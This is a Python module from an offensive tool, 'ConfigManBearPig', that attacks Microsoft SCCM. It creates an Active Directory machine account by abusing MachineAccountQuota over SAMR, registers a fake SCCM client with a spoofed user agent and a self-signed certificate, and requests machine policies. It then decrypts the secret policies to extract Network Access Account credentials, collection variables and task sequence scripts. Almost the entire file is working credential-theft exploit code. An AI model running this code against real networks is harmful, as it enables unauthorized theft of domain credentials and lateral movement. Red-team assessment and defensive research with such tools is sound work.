"""
SCCM Management Point client for ConfigManBearPig.

Implements SCCM client registration, policy request, and secret extraction
for attack techniques CRED-1 and CRED-2.

Workflow:
  1. Generate self-signed certificate (or use PXE-extracted cert)
  2. Register as SCCM client with management point
  3. Request machine policy assignments
  4. Download and decrypt secret policies
  5. Deobfuscate NAA credentials, collection variables, task sequences

References:
- SCCMSecrets: https://github.com/synacktiv/SCCMSecrets
- SharpSCCM: https://github.com/Mayyhem/SharpSCCM
"""

import binascii
import logging
import os
import re
import uuid
import xml.etree.ElementTree as ET
import zlib
from datetime import datetime
from typing import Any, Optional

import requests
from requests_ntlm import HttpNtlmAuth

from lib.sccm_crypto import (
    decrypt_cms_policy,
    deobfuscate_secret_policy_blob,
)

logger = logging.getLogger("ConfigManBearPig")

# SCCM date format
_DATE_FORMAT = "%Y-%m-%dT%H:%M:%SZ"

# User agent matching real SCCM client
_MP_HEADERS = {"User-Agent": "ConfigMgr Messaging HTTP Sender"}


# ------------------------------------------------------------------ #
#  Certificate and Key Generation
# ------------------------------------------------------------------ #

def create_sccm_private_key():
    """
    Generate a 2048-bit RSA private key for SCCM client authentication.

    Returns:
        cryptography RSA private key object
    """
    from cryptography.hazmat.primitives.asymmetric import rsa
    return rsa.generate_private_key(public_exponent=65537, key_size=2048)


def create_sccm_certificate(private_key):
    """
    Create a self-signed X.509 certificate suitable for SCCM client registration.

    The certificate includes the SCCM-specific OIDs:
      - 1.3.6.1.4.1.311.101.2 (SMS Signing)
      - 1.3.6.1.4.1.311.101   (SMS Encryption)

    Args:
        private_key: RSA private key

    Returns:
        cryptography x509.Certificate object
    """
    from cryptography import x509
    from cryptography.x509.oid import NameOID
    from cryptography.x509 import ObjectIdentifier
    from cryptography.hazmat.primitives import hashes
    from datetime import timedelta

    cn_attr = x509.NameAttribute(NameOID.COMMON_NAME, "ConfigMgr Client")
    subject = issuer = x509.Name([cn_attr])

    cert = (
        x509.CertificateBuilder()
        .subject_name(subject)
        .issuer_name(issuer)
        .public_key(private_key.public_key())
        .serial_number(x509.random_serial_number())
        .not_valid_before(datetime.utcnow() - timedelta(days=2))
        .not_valid_after(datetime.utcnow() + timedelta(days=365))
        .add_extension(
            x509.KeyUsage(
                digital_signature=True, key_encipherment=False,
                key_cert_sign=False, key_agreement=False,
                content_commitment=False, data_encipherment=True,
                crl_sign=False, encipher_only=False, decipher_only=False,
            ),
            critical=False,
        )
        .add_extension(
            x509.ExtendedKeyUsage([
                ObjectIdentifier("1.3.6.1.4.1.311.101.2"),  # SMS Signing
                ObjectIdentifier("1.3.6.1.4.1.311.101"),    # SMS Encryption
            ]),
            critical=False,
        )
        .sign(private_key, hashes.SHA256())
    )
    return cert


def sccm_sign(private_key, data: bytes) -> bytes:
    """
    Sign data using SCCM's reversed-signature scheme (SHA-256 + PKCS1v15).

    SCCM expects the signature bytes in reversed order.

    Args:
        private_key: RSA private key
        data: Bytes to sign

    Returns:
        Reversed signature bytes
    """
    from cryptography.hazmat.primitives.asymmetric.padding import PKCS1v15
    from cryptography.hazmat.primitives import hashes

    signature = private_key.sign(data, PKCS1v15(), hashes.SHA256())
    sig_reversed = bytearray(signature)
    sig_reversed.reverse()
    return bytes(sig_reversed)


def build_ms_public_key_blob(private_key) -> str:
    """
    Build a Microsoft PUBLICKEYBLOB from an RSA key (hex string).

    Matches the format expected by SCCM's ClientRegistrationRequest.

    Returns:
        Hex-encoded uppercase public key blob string
    """
    header = b"\x06\x02\x00\x00\x00\xA4\x00\x00\x52\x53\x41\x31\x00\x08\x00\x00\x01\x00\x01\x00"
    modulus = private_key.public_key().public_numbers().n
    modulus_bytes = modulus.to_bytes(private_key.key_size // 8, byteorder="little")
    return (header + modulus_bytes).hex().upper()


def _encode_utf16_strip_bom(data: str) -> bytes:
    """Encode string as UTF-16 and strip the BOM."""
    return data.encode('utf-16')[2:]


def _clean_xml(xml_string: str) -> str:
    """Strip trailing junk after the last closing XML tag."""
    root_end = xml_string.rfind('</')
    if root_end != -1:
        root_end = xml_string.find('>', root_end) + 1
        return xml_string[:root_end]
    return xml_string


# ------------------------------------------------------------------ #
#  Machine Account Creation
# ------------------------------------------------------------------ #

def _check_machine_account_prereqs(
    domain: str,
    domain_controller: str,
    username: str,
    password: str,
    sam_account: str,
) -> None:
    """
    LDAP pre-checks: MachineAccountQuota > 0 and account doesn't already exist.

    Raises RuntimeError if prerequisites are not met.
    """
    from ldap3 import (
        ALL,
        NTLM,
        AUTO_BIND_NO_TLS,
        Connection,
        Server,
    )

    base_dn = ",".join(f"DC={p}" for p in domain.split("."))

    server = Server(
        domain_controller,
        port=389,
        use_ssl=False,
        get_info=ALL,
        connect_timeout=10,
    )

    conn = Connection(
        server,
        user=username,
        password=password,
        authentication=NTLM,
        auto_bind=AUTO_BIND_NO_TLS,
    )

    try:
        # Check MachineAccountQuota
        conn.search(
            search_base=base_dn,
            search_filter="(objectClass=domain)",
            attributes=["ms-DS-MachineAccountQuota"],
        )
        if conn.entries:
            maq = conn.entries[0]["ms-DS-MachineAccountQuota"].value
            if maq is not None and int(maq) <= 0:
                raise RuntimeError(
                    f"MachineAccountQuota is {maq} — domain users cannot create machine accounts. "
                    f"Provide existing machine credentials with --machine-name and --machine-pass."
                )
            logger.info(f"MachineAccountQuota: {maq}")

        # Check if machine already exists
        conn.search(
            search_base=base_dn,
            search_filter=f"(sAMAccountName={sam_account})",
            attributes=["sAMAccountName"],
        )
        if conn.entries:
            raise RuntimeError(
                f"Machine account {sam_account} already exists in AD. "
                f"Use a different --machine-name or provide its password with --machine-pass."
            )
    finally:
        conn.unbind()


def create_machine_account(
    domain: str,
    domain_controller: str,
    username: str,
    password: str,
    machine_name: Optional[str] = None,
    machine_password: Optional[str] = None,
) -> tuple[str, str]:
    """
    Create a machine account in Active Directory via SAMR over SMB.

    Uses impacket's addcomputer SAMR approach (port 445) — same method
    used by Windows GUI when joining a domain. Avoids LDAPS requirement.

    Uses MachineAccountQuota mechanism — domain users can add up to
    ms-DS-MachineAccountQuota (default: 10) computer objects.

    Args:
        domain: Domain name (e.g., mayyhem.com)
        domain_controller: DC hostname or IP
        username: DOMAIN\\user for authentication
        password: User password
        machine_name: Machine account name (without $). Auto-generated if None.
        machine_password: Password for the machine account. Auto-generated if None.

    Returns:
        Tuple of (DOMAIN\\MACHINE$, password)

    Raises:
        RuntimeError: If account creation fails
    """
    from impacket.dcerpc.v5 import samr, epm, transport

    if not machine_name:
        machine_name = f"CMBP-{uuid.uuid4().hex[:8].upper()}"

    # Strip trailing $ if provided
    machine_name = machine_name.rstrip("$")

    if not machine_password:
        import string
        import secrets
        chars = string.ascii_letters + string.digits + "!@#$%"
        machine_password = "".join(secrets.choice(chars) for _ in range(24))

    sam_account = f"{machine_name}$"
    domain_parts = domain.split(".")
    domain_upper = domain_parts[0].upper()

    # Parse DOMAIN\user format
    if "\\" in username:
        auth_domain, auth_user = username.split("\\", 1)
    elif "@" in username:
        auth_user, auth_domain = username.split("@", 1)
    else:
        auth_domain = domain_upper
        auth_user = username

    logger.info(f"Creating machine account: {sam_account}")

    # LDAP pre-checks (MAQ and existence)
    _check_machine_account_prereqs(domain, domain_controller, username, password, sam_account)

    # Use impacket's SAMR over SMB (same as addcomputer.py --method SAMR)
    string_binding = epm.hept_map(
        domain_controller, samr.MSRPC_UUID_SAMR, protocol='ncacn_np'
    )
    rpc_transport = transport.DCERPCTransportFactory(string_binding)
    rpc_transport.set_dport(445)
    rpc_transport.setRemoteHost(domain_controller)

    if hasattr(rpc_transport, 'set_credentials'):
        rpc_transport.set_credentials(auth_user, password, auth_domain, '', '', None)

    serv_handle = None
    domain_handle = None
    user_handle = None
    dce = rpc_transport.get_dce_rpc()

    try:
        dce.connect()
        dce.bind(samr.MSRPC_UUID_SAMR)

        # Connect to SAM
        resp = samr.hSamrConnect5(
            dce, f'\\\\{domain_controller}\x00',
            samr.SAM_SERVER_ENUMERATE_DOMAINS | samr.SAM_SERVER_LOOKUP_DOMAIN,
        )
        serv_handle = resp['ServerHandle']

        # Find domain
        resp = samr.hSamrEnumerateDomainsInSamServer(dce, serv_handle)
        domains_list = resp['Buffer']['Buffer']
        non_builtin = [d for d in domains_list if d['Name'].lower() != 'builtin']

        if not non_builtin:
            raise RuntimeError("Could not find domain in SAM server")

        selected_domain = non_builtin[0]['Name']
        resp = samr.hSamrLookupDomainInSamServer(dce, serv_handle, selected_domain)
        domain_sid = resp['DomainId']

        resp = samr.hSamrOpenDomain(
            dce, serv_handle,
            samr.DOMAIN_LOOKUP | samr.DOMAIN_CREATE_USER,
            domain_sid,
        )
        domain_handle = resp['DomainHandle']

        # Verify account doesn't exist via SAMR
        try:
            samr.hSamrLookupNamesInDomain(dce, domain_handle, [sam_account])
            raise RuntimeError(
                f"Machine account {sam_account} already exists. "
                f"Use a different --machine-name or provide its password with --machine-pass."
            )
        except samr.DCERPCSessionError as e:
            if e.error_code != 0xc0000073:  # STATUS_NONE_MAPPED = not found (expected)
                raise

        # Create the machine account
        resp = samr.hSamrCreateUser2InDomain(
            dce, domain_handle, sam_account,
            samr.USER_WORKSTATION_TRUST_ACCOUNT,
            samr.USER_FORCE_PASSWORD_CHANGE,
        )
        user_handle = resp['UserHandle']

        # Set password
        samr.hSamrSetPasswordInternal4New(dce, user_handle, machine_password)

        # Re-open with MAXIMUM_ALLOWED to set UAC
        samr.hSamrCloseHandle(dce, user_handle)
        check = samr.hSamrLookupNamesInDomain(dce, domain_handle, [sam_account])
        user_rid = check['RelativeIds']['Element'][0]
        resp = samr.hSamrOpenUser(dce, domain_handle, samr.MAXIMUM_ALLOWED, user_rid)
        user_handle = resp['UserHandle']

        # Enable account: set WORKSTATION_TRUST_ACCOUNT
        req = samr.SAMPR_USER_INFO_BUFFER()
        req['tag'] = samr.USER_INFORMATION_CLASS.UserControlInformation
        req['Control']['UserAccountControl'] = samr.USER_WORKSTATION_TRUST_ACCOUNT
        samr.hSamrSetInformationUser2(dce, user_handle, req)

    except samr.DCERPCSessionError as e:
        raise RuntimeError(f"SAMR operation failed: {e}")
    finally:
        if user_handle is not None:
            samr.hSamrCloseHandle(dce, user_handle)
        if domain_handle is not None:
            samr.hSamrCloseHandle(dce, domain_handle)
        if serv_handle is not None:
            samr.hSamrCloseHandle(dce, serv_handle)
        dce.disconnect()

    full_account = f"{domain_upper}\\{sam_account}"
    logger.info(f"Machine account created: {full_account}")
    return full_account, machine_password


# ------------------------------------------------------------------ #
#  SCCM Client Class
# ------------------------------------------------------------------ #

class SCCMPolicyClient:
    """
    SCCM Management Point client for policy retrieval and secret extraction.

    Implements the full CRED-2 workflow:
      1. Register a fake SCCM client
      2. Request machine policy assignments
      3. Download and decrypt secret policies
      4. Extract NAA credentials, collection variables, task sequence secrets
    """

    def __init__(
        self,
        management_point: str,
        client_name: str,
        *,
        private_key=None,
        certificate=None,
        machine_name: Optional[str] = None,
        machine_pass: Optional[str] = None,
        use_altauth: bool = False,
        pki_cert_path: Optional[str] = None,
        pki_key_path: Optional[str] = None,
    ):
        """
        Args:
            management_point: Full URL (http://mp.domain.com or https://...)
            client_name: FQDN to register (e.g., FAKE-PC.domain.com)
            private_key: RSA private key (generated if not provided)
            certificate: X.509 certificate (generated if not provided)
            machine_name: Machine account for NTLM auth (DOMAIN\\MACHINE$)
            machine_pass: Machine account password
            use_altauth: Use ccm_system_altauth endpoint (mTLS bypass)
            pki_cert_path: PEM cert for mTLS
            pki_key_path: PEM key for mTLS
        """
        self.management_point = management_point
        self.client_name = client_name
        self.use_altauth = use_altauth
        self.use_https = management_point.startswith('https://')
        self.client_guid = ""
        self.secret_policies: dict[str, dict] = {}

        # Certificate setup
        if private_key is None:
            self.private_key = create_sccm_private_key()
            self.certificate = create_sccm_certificate(self.private_key)
        else:
            self.private_key = private_key
            self.certificate = certificate

        from cryptography.hazmat.primitives import serialization
        self.public_key_hex = self.certificate.public_bytes(
            serialization.Encoding.DER
        ).hex().upper()

        # HTTP session
        self.session = requests.Session()
        self.session.headers.update(_MP_HEADERS)
        self.session.verify = False

        if machine_name and machine_pass:
            self.session.auth = HttpNtlmAuth(machine_name, machine_pass)

        # TLS client certificate setup for HTTPS
        #
        # Three modes:
        #   1. PKI cert provided (--pki-cert/--pki-key): use it for mTLS
        #   2. Enhanced HTTP (no machine creds, no altauth): self-signed cert as TLS client cert
        #   3. NTLM auth (--machine-name/--machine-pass): NO client cert — windowsauth
        #      uses NTLM headers, not certificates. Presenting an untrusted self-signed
        #      cert alongside NTLM causes IIS to return empty responses.
        #   4. altauth: no client cert needed (mTLS bypass)
        #
        self._temp_cert_dir = None
        if self.use_https:
            if pki_cert_path and pki_key_path:
                # Use provided PKI certificates for mTLS
                self.session.cert = (pki_cert_path, pki_key_path)
            elif not use_altauth and not self.session.auth:
                # Enhanced HTTP only: use self-signed cert as TLS client cert.
                # SCCM Enhanced HTTP accepts self-signed client certs in the
                # TLS handshake — same approach as PXEThief/sccmwtf/SCCMHunter.
                # Only when NO NTLM auth is configured (self.session.auth is None).
                import tempfile
                self._temp_cert_dir = tempfile.mkdtemp(prefix="cmbp_cert_")
                cert_pem_path = os.path.join(self._temp_cert_dir, "cert.pem")
                key_pem_path = os.path.join(self._temp_cert_dir, "key.pem")
                with open(cert_pem_path, 'wb') as f:
                    f.write(self.certificate.public_bytes(serialization.Encoding.PEM))
                with open(key_pem_path, 'wb') as f:
                    f.write(self.private_key.private_bytes(
                        encoding=serialization.Encoding.PEM,
                        format=serialization.PrivateFormat.TraditionalOpenSSL,
                        encryption_algorithm=serialization.NoEncryption(),
                    ))
                self.session.cert = (cert_pem_path, key_pem_path)
                logger.debug("Using self-signed cert as TLS client cert (Enhanced HTTP)")
            elif self.session.auth:
                logger.debug("NTLM auth configured — skipping TLS client cert (windowsauth)")
            else:
                logger.debug("altauth mode — skipping TLS client cert")

    def register_client(self) -> str:
        """
        Register a new SCCM client with the management point.

        Returns:
            Client GUID assigned by SCCM
        """
        logger.info(f"Registering SCCM client: {self.client_name}")

        # Build registration XML
        now = datetime.now().strftime(_DATE_FORMAT)
        short_name = self.client_name.split('.')[0]

        reg_request = (
            f'<Data HashAlgorithm="1.2.840.113549.1.1.11" SMSID="" '
            f'RequestType="Registration" TimeStamp="{now}">'
            f'<AgentInformation AgentIdentity="CCMSetup.exe" '
            f'AgentVersion="5.00.8325.0000" AgentType="0" />'
            f'<Certificates>'
            f'<Encryption Encoding="HexBinary" KeyType="1">{self.public_key_hex}</Encryption>'
            f'<Signing Encoding="HexBinary" KeyType="1">{self.public_key_hex}</Signing>'
            f'</Certificates>'
            f'<DiscoveryProperties>'
            f'<Property Name="Netbios Name" Value="{short_name}" />'
            f'<Property Name="FQ Name" Value="{self.client_name}" />'
            f'<Property Name="Locale ID" Value="2057" />'
            f'<Property Name="InternetFlag" Value="0" />'
            f'</DiscoveryProperties></Data>'
        )

        signature = sccm_sign(
            self.private_key,
            _encode_utf16_strip_bom(reg_request),
        ).hex().upper()

        wrapper = (
            f'<ClientRegistrationRequest>{reg_request}'
            f'<Signature><SignatureValue>{signature}</SignatureValue></Signature>'
            f'</ClientRegistrationRequest>\x00'
        )
        wrapper_bytes = _encode_utf16_strip_bom(wrapper) + b"\r\n"

        header = (
            f'<Msg ReplyCompression="zlib" SchemaVersion="1.1">'
            f'<Body Type="ByteRange" Length="{len(wrapper_bytes) - 2}" Offset="0" />'
            f'<CorrelationID>{{00000000-0000-0000-0000-000000000000}}</CorrelationID>'
            f'<Hooks><Hook3 Name="zlib-compress" /></Hooks>'
            f'<ID>{{5DD100CD-DF1D-45F5-BA17-A327F43465F8}}</ID>'
            f'<Payload Type="inline" /><Priority>0</Priority>'
            f'<Protocol>http</Protocol><ReplyMode>Sync</ReplyMode>'
            f'<ReplyTo>direct:{self.client_name}:SccmMessaging</ReplyTo>'
            f'<SentTime>{now}</SentTime>'
            f'<SourceHost>{self.client_name}</SourceHost>'
            f'<TargetAddress>mp:MP_ClientRegistration</TargetAddress>'
            f'<TargetEndpoint>MP_ClientRegistration</TargetEndpoint>'
            f'<TargetHost>{self.management_point}</TargetHost>'
            f'<Timeout>60000</Timeout></Msg>'
        )

        # Build multipart body
        boundary = "aAbBcCdDv1234567890VxXyYzZ"
        body = f"--{boundary}\r\ncontent-type: text/plain; charset=UTF-16\r\n\r\n".encode('ascii')
        body += header.encode('utf-16')
        body += f"\r\n--{boundary}\r\ncontent-type: application/octet-stream\r\n\r\n".encode('ascii')
        body += zlib.compress(wrapper_bytes)
        body += f"\r\n--{boundary}--".encode('ascii')

        # Select endpoint
        if self.use_altauth:
            endpoint = f"{self.management_point}/ccm_system_altauth/request"
        elif self.session.auth:
            endpoint = f"{self.management_point}/ccm_system_windowsauth/request"
        else:
            endpoint = f"{self.management_point}/ccm_system/request"

        headers = {
            "Connection": "close",
            "Content-Type": f'multipart/mixed; boundary="{boundary}"',
        }

        r = self.session.request("CCM_POST", endpoint,
                                 headers={**self.session.headers, **headers},
                                 data=body)

        if r.status_code != 200:
            raise RuntimeError(f"Client registration failed: HTTP {r.status_code}")

        # Diagnostic logging for troubleshooting
        logger.debug(
            f"Registration response: Status={r.status_code}, "
            f"Content-Type={r.headers.get('Content-Type', 'none')}, "
            f"Content-Length={len(r.content)}, "
            f"TLS-client-cert={'yes' if self.session.cert else 'no'}, "
            f"NTLM-auth={'yes' if self.session.auth else 'no'}"
        )

        # Parse multipart response to get GUID
        response_text = self._extract_multipart_body(r)
        if not response_text or not response_text.strip():
            raise RuntimeError(
                f"Empty response from MP ({endpoint}). "
                f"Status: {r.status_code}, "
                f"Content-Type: {r.headers.get('Content-Type', 'none')}, "
                f"Content-Length: {len(r.content)}, "
                f"Body (first 200 bytes): {r.content[:200]!r}"
            )

        root = ET.fromstring(response_text[:-1] if response_text.endswith('\x00') else response_text)
        self.client_guid = root.attrib["SMSID"].split("GUID:")[1]

        logger.info(f"Client registered: GUID={self.client_guid}")
        return self.client_guid

    def request_policies(self) -> dict[str, dict]:
        """
        Request machine policy assignments from the management point.

        Returns:
            Dict mapping PolicyID -> policy metadata (including PolicyFlags)
        """
        if not self.client_guid:
            raise RuntimeError("Client not registered. Call register_client() first.")

        logger.info(f"Requesting policies for {self.client_name}")

        now = datetime.now().strftime(_DATE_FORMAT)
        short_name = self.client_name.split('.')[0]

        # Build policy request body
        policy_body = _encode_utf16_strip_bom(
            f'<RequestAssignments SchemaVersion="1.00" ACK="false" RequestType="Always">'
            f'<Identification><Machine>'
            f'<ClientID>GUID:{self.client_guid}</ClientID>'
            f'<FQDN>{self.client_name}</FQDN>'
            f'<NetBIOSName>{short_name}</NetBIOSName>'
            f'<SID /></Machine><User /></Identification>'
            f'<PolicySource>SMS:PRI</PolicySource>'
            f'<Resource ResourceType="Machine" />'
            f'<ServerCookie /></RequestAssignments>'
        ) + b"\x00\x00\r\n"
        compressed_body = zlib.compress(policy_body)

        # Build authenticated header
        ms_public_key = build_ms_public_key_blob(self.private_key)
        client_id_str = f"GUID:{self.client_guid.upper()}"
        client_id_sig = sccm_sign(
            self.private_key,
            _encode_utf16_strip_bom(client_id_str) + b"\x00\x00",
        ).hex().upper()
        payload_sig = sccm_sign(self.private_key, compressed_body).hex().upper()

        header = (
            f'<Msg ReplyCompression="zlib" SchemaVersion="1.1">'
            f'<Body Type="ByteRange" Length="{len(policy_body) - 2}" Offset="0" />'
            f'<CorrelationID>{{00000000-0000-0000-0000-000000000000}}</CorrelationID>'
            f'<Hooks><Hook2 Name="clientauth">'
            f'<Property Name="AuthSenderMachine">{short_name}</Property>'
            f'<Property Name="PublicKey">{ms_public_key}</Property>'
            f'<Property Name="ClientIDSignature">{client_id_sig}</Property>'
            f'<Property Name="PayloadSignature">{payload_sig}</Property>'
            f'<Property Name="ClientCapabilities">NonSSL</Property>'
            f'<Property Name="HashAlgorithm">1.2.840.113549.1.1.11</Property>'
            f'</Hook2><Hook3 Name="zlib-compress" /></Hooks>'
            f'<ID>{{041A35B4-DCEE-4F64-A978-D4D489F47D28}}</ID>'
            f'<Payload Type="inline" /><Priority>0</Priority>'
            f'<Protocol>http</Protocol><ReplyMode>Sync</ReplyMode>'
            f'<ReplyTo>direct:{short_name}:SccmMessaging</ReplyTo>'
            f'<SentTime>{now}</SentTime>'
            f'<SourceID>GUID:{self.client_guid}</SourceID>'
            f'<SourceHost>{short_name}</SourceHost>'
            f'<TargetAddress>mp:MP_PolicyManager</TargetAddress>'
            f'<TargetEndpoint>MP_PolicyManager</TargetEndpoint>'
            f'<TargetHost>{self.management_point}</TargetHost>'
            f'<Timeout>60000</Timeout></Msg>'
        )

        # Build multipart body
        boundary = "aAbBcCdDv1234567890VxXyYzZ"
        body = f"--{boundary}\r\ncontent-type: text/plain; charset=UTF-16\r\n\r\n".encode('ascii')
        body += header.encode('utf-16')
        body += f"\r\n--{boundary}\r\ncontent-type: application/octet-stream\r\n\r\n".encode('ascii')
        body += compressed_body
        body += f"\r\n--{boundary}--".encode('ascii')

        endpoint = f"{self.management_point}/ccm_system/request"
        if self.use_altauth:
            endpoint = f"{self.management_point}/ccm_system_altauth/request"

        headers = {
            "Connection": "close",
            "Content-Type": f'multipart/mixed; boundary="{boundary}"',
        }

        r = self.session.request("CCM_POST", endpoint,
                                 headers={**self.session.headers, **headers},
                                 data=body)

        if r.status_code != 200:
            raise RuntimeError(f"Policy request failed: HTTP {r.status_code}")

        # Parse policy list
        response_text = self._extract_multipart_body(r)
        root = ET.fromstring(
            response_text[:-1] if response_text.endswith('\x00') else response_text
        )

        mp_host = self.management_point.split('://')[1] if '://' in self.management_point else self.management_point

        policies = {}
        for policy in root.findall(".//Policy"):
            pid = policy.attrib.get("PolicyID", "")
            flags_raw = policy.attrib.get("PolicyFlags", "0")
            flags = self._parse_policy_flags(int(flags_raw))
            location = ""
            if len(policy) > 0 and policy[0].text:
                location = policy[0].text.replace("<mp>", mp_host)
                if self.use_https:
                    location = location.replace('http://', 'https://')

            policies[pid] = {
                "PolicyVersion": policy.attrib.get("PolicyVersion", "N/A"),
                "PolicyType": policy.attrib.get("PolicyType", "N/A"),
                "PolicyCategory": policy.attrib.get("PolicyCategory", "N/A"),
                "PolicyFlags": flags,
                "PolicyLocation": location,
            }

            if "SECRET" in flags:
                self.secret_policies[pid] = policies[pid]

        logger.info(f"Retrieved {len(policies)} policies ({len(self.secret_policies)} secret)")
        return policies

    def extract_secrets(
        self,
        show_cleartext: bool = False,
    ) -> dict[str, Any]:
        """
        Download and decrypt all secret policies, extracting credentials.

        Returns:
            Dict with keys: naa_accounts (list of {username, password}),
                           collection_variables (list of {name, value}),
                           task_sequences (list of str),
                           certificates (list of str)
        """
        results: dict[str, Any] = {
            "naa_accounts": [],
            "collection_variables": [],
            "task_sequences": [],
            "certificates": [],
        }

        if not self.secret_policies:
            logger.info("No secret policies to extract")
            return results

        for pid, policy in self.secret_policies.items():
            try:
                self._process_secret_policy(pid, policy, results, show_cleartext)
            except Exception as e:
                logger.warning(f"Failed to process secret policy {pid}: {e}")

        return results

    def _process_secret_policy(
        self,
        policy_id: str,
        policy: dict,
        results: dict,
        show_cleartext: bool,
    ) -> None:
        """Download and process a single secret policy."""
        logger.info(f"Processing secret policy: {policy_id}")

        # Download the policy
        policy_url = policy.get("PolicyLocation", "")
        if not policy_url:
            return

        if self.use_altauth:
            policy_url = policy_url.replace('/SMS_MP/', '/SMS_MP_ALTAUTH/')

        # Build client token
        now = datetime.now().strftime(_DATE_FORMAT)
        token = f"GUID:{self.client_guid};{now};2"
        token_sig = sccm_sign(
            self.private_key,
            token.encode('utf-16')[2:] + b"\x00\x00",
        ).hex().upper()

        additional_headers = {
            "Connection": "close",
            "ClientToken": token,
            "ClientTokenSignature": token_sig,
        }

        r = self.session.get(
            policy_url if policy_url.startswith('http') else f"{self.management_point}{policy_url}",
            headers={**self.session.headers, **additional_headers},
        )

        if r.status_code != 200:
            logger.warning(f"Policy {policy_id} download failed: HTTP {r.status_code}")
            return

        # Decrypt policy content
        policy_text = None

        # Try direct UTF-16 decode first (HTTPS site-wide)
        try:
            policy_text = r.content.decode('utf-16')
        except (UnicodeDecodeError, UnicodeError):
            pass

        # Try CMS decryption
        if policy_text is None:
            policy_text = decrypt_cms_policy(r.content, self.private_key)

        if policy_text is None:
            logger.warning(f"Could not decrypt policy {policy_id}")
            return

        if policy_text.endswith('\x00'):
            policy_text = policy_text[:-1]
        policy_text = _clean_xml(policy_text)

        # Handle CollectionSettings (compressed hex blob)
        category = policy.get("PolicyCategory", "")
        if category == "CollectionSettings":
            try:
                root = ET.fromstring(policy_text)
                if root.text:
                    binary_data = binascii.unhexlify(root.text)
                    decompressed = zlib.decompress(binary_data)
                    policy_text = decompressed.decode('utf-16')
            except Exception as e:
                logger.debug(f"Collection settings decompression failed: {e}")

        # Extract secret blobs
        try:
            root = ET.fromstring(policy_text)
        except ET.ParseError:
            logger.debug(f"Policy {policy_id} is not valid XML")
            return

        blobs: dict[str, str] = {}
        if category == "CollectionSettings":
            for instance in root.findall(".//instance"):
                name = value = None
                for prop in instance.findall('property'):
                    prop_name = prop.get('name')
                    if prop_name == 'Name':
                        name = prop.find('value').text.strip() if prop.find('value') is not None else None
                    elif prop_name == 'Value':
                        value = prop.find('value').text.strip() if prop.find('value') is not None else None
                if name and value:
                    blobs[name] = value
                    results["collection_variables"].append({"name": name, "value": "(encrypted)"})
        else:
            for elem in root.findall('.//*[@secret="1"]'):
                blob_name = elem.attrib.get("name", "unknown")
                if len(elem) > 0 and elem[0].text:
                    blobs[blob_name] = elem[0].text

        # Deobfuscate each blob
        for blob_name, blob_hex in blobs.items():
            plaintext = deobfuscate_secret_policy_blob(blob_hex)
            if plaintext is None:
                continue

            if blob_name == "NetworkAccessUsername":
                results["naa_accounts"].append({"username": plaintext, "password": None})
                if show_cleartext:
                    logger.info(f"NAA Username: {plaintext}")
                else:
                    logger.info(f"NAA Username found (use --show-cleartext-passwords to display)")
            elif blob_name == "NetworkAccessPassword":
                # Match with last username
                if results["naa_accounts"] and results["naa_accounts"][-1]["password"] is None:
                    results["naa_accounts"][-1]["password"] = plaintext
                if show_cleartext:
                    logger.info(f"NAA Password: {plaintext}")
                else:
                    logger.info("NAA Password found (use --show-cleartext-passwords to display)")

            # Check for embedded task sequences / scripts
            try:
                blob_root = ET.fromstring(_clean_xml(plaintext))
                scripts = blob_root.findall('.//*[@property="SourceScript"]')
                if scripts:
                    for script in scripts:
                        if script.text:
                            import base64
                            decoded = base64.b64decode(script.text).decode('utf-16le')
                            results["task_sequences"].append(decoded)
            except ET.ParseError:
                pass

            if category == "CollectionSettings":
                # Update the collection variable with deobfuscated value
                for cv in results["collection_variables"]:
                    if cv["name"] == blob_name and cv["value"] == "(encrypted)":
                        if show_cleartext:
                            cv["value"] = plaintext
                        else:
                            cv["value"] = "(decrypted - use --show-cleartext-passwords)"
                        break

    def _extract_multipart_body(self, response: requests.Response) -> str:
        """Extract the decompressed body from a multipart SCCM response."""
        if not response.content:
            return ""

        # Use requests_toolbelt for proper multipart decoding (matches SCCMSecrets)
        try:
            from requests_toolbelt.multipart import decoder
            multipart_data = decoder.MultipartDecoder.from_response(response)
            for part in multipart_data.parts:
                ct = part.headers.get(b'content-type', b'')
                if ct == b'application/octet-stream':
                    return zlib.decompress(part.content).decode('utf-16')
        except ImportError:
            pass  # Fall through to manual parsing
        except Exception as e:
            logger.warning(f"requests_toolbelt multipart decode failed: {e}")
            # Fall through to manual parsing

        # Fallback: manual boundary-based parsing
        content_type = response.headers.get('Content-Type', '')
        boundary_match = re.search(r'boundary="?([^";\s]+)"?', content_type)
        if not boundary_match:
            # Not multipart — try direct UTF-16 decode
            return response.content.decode('utf-16', errors='ignore')

        boundary = boundary_match.group(1).encode('ascii')
        parts = response.content.split(b'--' + boundary)

        for part in parts:
            if b'application/octet-stream' in part:
                header_end = part.find(b'\r\n\r\n')
                if header_end == -1:
                    continue
                body = part[header_end + 4:]
                if body.endswith(b'\r\n'):
                    body = body[:-2]
                if body.endswith(b'--'):
                    body = body[:-2]
                try:
                    return zlib.decompress(body).decode('utf-16')
                except Exception:
                    pass

        # Nothing found — return empty to let caller handle
        logger.warning(
            f"Multipart extraction failed. Content-Type: {content_type}, "
            f"Content-Length: {len(response.content)}, "
            f"Response-Headers: {dict(response.headers)}"
        )
        return ""

    def cleanup(self) -> None:
        """Remove temporary certificate files."""
        if self._temp_cert_dir:
            import shutil
            try:
                shutil.rmtree(self._temp_cert_dir, ignore_errors=True)
            except Exception:
                pass
            self._temp_cert_dir = None

    @staticmethod
    def _parse_policy_flags(value: int) -> list[str]:
        """Parse SCCM policy flag bitmask into human-readable strings."""
        flags = []
        if value & 0x01:
            flags.append("TASKSEQUENCE")
        if value & 0x02:
            flags.append("REQUIRESAUTH")
        if value & 0x04:
            flags.append("SECRET")
        if value & 0x08:
            flags.append("INTRANETONLY")
        if value & 0x10:
            flags.append("PERSISTWHOLEPOLICY")
        if value & 0x20:
            flags.append("AUTHORIZEDDYNAMICDOWNLOAD")
        if value & 0x40:
            flags.append("COMPRESSED")
        return flags
